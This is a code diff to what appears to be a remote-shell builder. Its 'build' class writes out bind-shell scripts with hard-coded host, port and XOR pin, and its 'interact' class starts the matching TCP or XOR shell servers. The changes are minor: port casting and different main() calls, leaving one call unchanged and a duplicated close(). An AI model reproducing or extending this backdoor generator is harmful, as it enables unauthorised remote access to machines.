@@ -324,7 +324,7 @@ class interact:
             elif option.startswith(":start"):
                 if core.check_options(self.HOST, self.PORT, self.TYPE, self.PKEY):
                     if self.TYPE == "tcp":
-                        shells.tcp.server(self.HOST, self.PORT, self.NAME)
+                        shells.tcp.server(self.HOST, self.PORT)
                     elif self.TYPE == "xor":
                         shells.xor.server(self.HOST, self.PORT, self.PKEY)
                     else:
@@ -383,7 +383,7 @@ class build:
                 if core.check_options(host, port, 'tcp', ''):
                     makeshell = open(Scripts+name, "a")
                     makeshell.write("\nHOST = '%s'" % host)
-                    makeshell.write("\nPORT = %s" % port)
+                    makeshell.write("\nPORT = int(%s)" % port)
                     makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                     makeshell.write("\nconn.bind((HOST, PORT))")
                     makeshell.write("\nconn.listen(5)")
@@ -412,9 +412,8 @@ class build:
                 if core.check_options(host, port, 'tcp', ''):
                     newshell = open(Scripts+name, "a")
                     newshell.write("\n    HOST = '%s'" % host)
-                    newshell.write("\n    PORT = %s" % port)
-                    newshell.write("\n\nglobalvars()")
-                    newshell.write("\nmain()")
+                    newshell.write("\n    PORT = int(%s)" % port)
+                    newshell.write("\nmain(HOST, PORT)")
                     newshell.close()
                     core.status("new shell created!")
                     core.status("location: %s" % Scripts+name)
@@ -439,7 +438,7 @@ class build:
                 if core.check_options(host, port, 'xor', key):
                     makeshell = open(Scripts+name, "a")
                     makeshell.write("\nHOST = '%s'" % host)
-                    makeshell.write("\nPORT = %s" % port)
+                    makeshell.write("\nPORT = int(%s)" % port)
                     makeshell.write("\npin = '%s'" % pin)
                     makeshell.write("\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
                     makeshell.write("\nconn.bind((HOST, PORT))")
@@ -469,9 +468,8 @@ class build:
                 if core.check_options(host, port, 'xor', key):
                     makeshell = open(Scripts+name, "a")
                     makeshell.write("\n    HOST = '%s'" % host)
-                    makeshell.write("\n    PORT = %s" % port)
+                    makeshell.write("\n    PORT = int(%s)" % port)
                     makeshell.write("\n    pin = '%s'" % pin)
-                    makeshell.write("\n\nglobalvars()")
                     makeshell.write("\nmain()")
                     makeshell.close()
                     makeshell.close()
